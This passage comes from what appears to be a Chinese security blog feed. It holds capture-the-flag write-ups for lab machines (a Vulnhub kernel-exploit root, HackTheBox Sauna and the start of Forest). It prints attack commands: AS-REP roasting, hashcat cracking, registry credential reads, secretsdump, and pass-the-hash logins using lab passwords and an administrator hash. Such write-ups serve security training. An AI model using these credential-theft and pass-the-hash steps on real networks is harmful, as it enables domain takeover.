<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们将linpeas.sh脚本上传到靶机上，并执行它<br><img src="https://img-blog.csdnimg.cn/23a8477f887a40c3b6df7f1df69d406b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现存在一个linux内核漏洞<br><img src="https://img-blog.csdnimg.cn/e962cb6858c242bea4f04c0d8d28b3b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们发现这个内核漏洞对应的漏洞编号为<code>CVE-2017-6074</code>，我们将其编译变上传到靶机上，执行即root<br><img src="https://img-blog.csdnimg.cn/8d5db74c976140df8fd5b0d408768a02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/335e4f13aa7e4d8c9ebaf95cb4c8749c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Sauna</title>
    <url>/2021/12/24/Sauna/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/0c4f7155f0a144fca320112bb07de39c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现开放了445，80，88，5985这些常见的可能存在漏洞的端口。因为存在ldap服务，可能考虑到存在内网<br><img src="https://img-blog.csdnimg.cn/18c6ed7749514992adad88f2a6fa97f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>发现了smb服务，尝试是否可以登录<br><img src="https://img-blog.csdnimg.cn/cae8f24d7edf4d9ab4db6a15e3d5c60b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>登录失败，那我们查看一下ldap有没有什么有价值的信息<br><img src="https://img-blog.csdnimg.cn/f0249267ceca4d73943001c895249779.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.10.175 -b <span class="string">&quot;dc=EGOTISTICAL-BANK,dc=local&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=EGOTISTICAL-BANK,dc=local&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: domain</span><br><span class="line">objectClass: domainDNS</span><br><span class="line">distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">instanceType: 5</span><br><span class="line">whenCreated: 20200123054425.0Z</span><br><span class="line">whenChanged: 20211018114224.0Z</span><br><span class="line">subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">uSNCreated: 4099</span><br><span class="line">dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==</span><br><span class="line">uSNChanged: 98336</span><br><span class="line">name: EGOTISTICAL-BANK</span><br><span class="line">objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==</span><br><span class="line">replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAJ/uf</span><br><span class="line"> RcDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA</span><br><span class="line"> AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4</span><br><span class="line"> TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==</span><br><span class="line">creationTime: 132790309446175365</span><br><span class="line">forceLogoff: -9223372036854775808</span><br><span class="line">lockoutDuration: -18000000000</span><br><span class="line">lockOutObservationWindow: -18000000000</span><br><span class="line">lockoutThreshold: 0</span><br><span class="line">maxPwdAge: -36288000000000</span><br><span class="line">minPwdAge: -864000000000</span><br><span class="line">minPwdLength: 7</span><br><span class="line">modifiedCountAtLastProm: 0</span><br><span class="line">nextRid: 1000</span><br><span class="line">pwdProperties: 1</span><br><span class="line">pwdHistoryLength: 24</span><br><span class="line">objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG</span><br><span class="line">serverState: 1</span><br><span class="line">uASCompat: 1</span><br><span class="line">modifiedCount: 1</span><br><span class="line">auditingPolicy:: AAE=</span><br><span class="line">nTMixedDomain: 0</span><br><span class="line">rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name</span><br><span class="line"> ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">systemFlags: -1946157056</span><br><span class="line">wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT</span><br><span class="line"> ISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra</span><br><span class="line"> m Data,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO</span><br><span class="line"> TISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin</span><br><span class="line"> cipals,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=</span><br><span class="line"> EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E</span><br><span class="line"> GOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO</span><br><span class="line"> TISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC</span><br><span class="line"> AL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,</span><br><span class="line"> DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS</span><br><span class="line"> TICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA</span><br><span class="line"> L-BANK,DC=LOCAL</span><br><span class="line">objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D</span><br><span class="line"> C=LOCAL</span><br><span class="line">isCriticalSystemObject: TRUE</span><br><span class="line">gPLink: [LDAP://CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=Policies,CN=Syste</span><br><span class="line"> m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]</span><br><span class="line">dSCorePropagationData: 16010101000000.0Z</span><br><span class="line">otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS</span><br><span class="line"> TICAL-BANK,DC=LOCAL</span><br><span class="line">otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic</span><br><span class="line"> e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN</span><br><span class="line"> =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">ms-DS-MachineAccountQuota: 10</span><br><span class="line">msDS-Behavior-Version: 7</span><br><span class="line">msDS-PerUserTrustQuota: 1</span><br><span class="line">msDS-AllUsersTrustQuota: 1000</span><br><span class="line">msDS-PerUserTrustTombstonesQuota: 10</span><br><span class="line">msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na</span><br><span class="line"> me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N</span><br><span class="line"> ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">msDS-NcType: 0</span><br><span class="line">msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE</span><br><span class="line">dc: EGOTISTICAL-BANK</span><br><span class="line"><span class="comment"># Users, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Computers, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Domain Controllers, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># System, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># LostAndFound, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Infrastructure, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Program Data, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># NTDS Quotas, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Managed Service Accounts, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Keys, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># TPM Devices, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Builtin, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Hugo Smith, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST</span><br><span class="line"> ICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST</span><br><span class="line"> ICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC</span><br><span class="line"> AL</span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"><span class="comment"># numResponses: 19</span></span><br><span class="line"><span class="comment"># numEntries: 15</span></span><br><span class="line"><span class="comment"># numReferences: 3</span></span><br></pre></td></tr></table></figure>
<!--more-->

<p>我们发现了一个可疑的用户。虽然是找到了用户名，但是我们不没有找到相对应的凭据。这时候我们切换一下思路，浏览一下web服务中有什么有价值的信息可以提供给我们的。<br><img src="https://img-blog.csdnimg.cn/b628002a16b3488681fd917e8308c38f.png" alt="在这里插入图片描述"><br>在关于页面，我们看到了这两个用户的信息，长得貌似和我们信息收集出来的用户信息有点类似。那我们可以猜测这有可能是系统中真实存在的用户。<br><img src="https://img-blog.csdnimg.cn/c588d6ef57d149fabf5e731d9cc5036d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试获取一下用户对应的哈希值，使用的工具是kerbrute，发现存在<code>hsmith</code>和<code>fsmith</code>这两个用户并且发现了它们的TGT条目。<img src="https://img-blog.csdnimg.cn/2627486af25c47ab96b900a0ec75f39b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们先使用impacket包中的<code>GetNPUsers.py</code>获取fsmith用户的hash值。<br><img src="https://img-blog.csdnimg.cn/c0949aa761a34cd5ac4cb072c102afb1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将他的hash值保存为一个文件，使用hashcat尝试能不能破解成功。破解成功的密码明文值为<code>Thestrokes23</code>。这里解释一下参数的含义，-m指的是指定文件的散列值类型，-a指的是指定破解模式，-w是指定字典。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 fsmith.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/41e6765292b042028af2e5a18a7e63c0.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e09120c6a3ab4d2ebc84502a9a0a58b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/353674983008426c8e5578b2c332cf9c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>既然破解到了密码，那我们可以登录SMB和WinRM服务了。我们先查看SMB服务，发现了两个共享服务，但是没有一个是有用的。。。<br><img src="https://img-blog.csdnimg.cn/03e072a109fb4bbea8beb8f0a955ab09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们尝试利用WinRM吧，登录成功，拿到第一个flag值。<br><img src="https://img-blog.csdnimg.cn/6b0e08188c09403f95a20de67f6292de.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们拿到的只是普通用户的权限，我们的目标当然是管理员权限。首先我们先看看都存在哪些用户，发现存在一个svc_loanmgr用户。<br><img src="https://img-blog.csdnimg.cn/db445cc21449494680e87b2d7ae329f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用powershell命令查看到它对应的密码。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#x27;</span> | <span class="built_in">select</span> <span class="string">&quot;Default*&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d774cd7d287541eb8c6c68b368fe0424.png" alt="在这里插入图片描述"><br>这个命令要记住它还是有一定难度的，我们也可以通过上传<code>WindowsEnum.ps1</code>脚本来完成这任务。<br><img src="https://img-blog.csdnimg.cn/86d1160f61414340a78ab8afd834f34a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8c4904ed1ffe46219f42192926e2b54c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现这个密码后，我们可以尝试使用登陆进去。但是我试了很多次都是登陆失败<br><img src="https://img-blog.csdnimg.cn/431a23d1a026444781060ce56c83ade6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那没办法了，我尝试使用<code>secretsdump.py</code>脚本看看能不能成功获取到这个用户的哈希值。我们意外发现administrator的hash值，发大财了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py -dc-ip 10.10.10.175 svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/24f4c7e28cee4d33bef37d56e48ad59a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用<code>evil-winrm</code>进行登录，同时我们还可以使用<code>wmiexec.py</code>这个脚本进行登录，但是后者的速度要相较前者慢得多</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/42316c86c9ba4720b9fd0f6684ecec19.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmiexec.py -hashes :823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b57c846f068946208ef0673c1765edf0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Forest</title>
    <url>/2021/12/24/Forest/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/2913cb4eedb44306869932340084824e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -Pn -A -p1-65535 10.10.10.161</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.161</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65511 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-21 11:03:55Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49671/tcp open  unknown</span><br><span class="line">49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49684/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49706/tcp open  unknown</span><br><span class="line">49931/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=10/21%OT=53%CT=1%CU=36900%PV=Y%DS=2%DC=T%G=Y%TM=617148</span><br><span class="line">OS:13%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=S%TS</span><br><span class="line">OS:=A)SEQ(SP=104%GCD=1%ISR=104%TI=I%CI=I%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8</span><br><span class="line">OS:ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=20</span><br><span class="line">OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5</span><br><span class="line">OS:4DNW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%D</span><br><span class="line">OS:F=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O</span><br><span class="line">OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W</span><br><span class="line">OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)</span><br><span class="line">OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U</span><br><span class="line">OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h26m49s, deviation: 4h02m32s, median: 6m47s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2021-10-21T04:05:16-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-10-21T11:05:15</span><br><span class="line">|_  start_date: 2021-10-21T07:03:53</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1723/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   321.85 ms 10.10.14.1</span><br><span class="line">2   321.83 ms 10.10.10.161</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3716.43 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>我们发现可以进行匿名登录，我们尝试匿名登录SMB服务，看看有哪些有价值的信息<br><img src="https://img-blog.csdnimg.cn/e568f2f0f0ef419da569481703bc97f1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>答案是没有，没有什么共享信息<br><img src="https://img-blog.csdnimg.cn/9315d9655d274be9baf1173d824bbf38.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

